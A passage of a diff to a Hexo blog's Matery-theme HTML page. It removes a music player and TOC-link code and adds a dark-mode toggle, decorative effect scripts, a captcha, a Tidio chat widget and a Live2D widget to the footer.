             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1137,89 +1319,42 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1366,6 +1501,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1380,6 +1539,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
@@ -1407,10 +1593,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1421,6 +1636,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
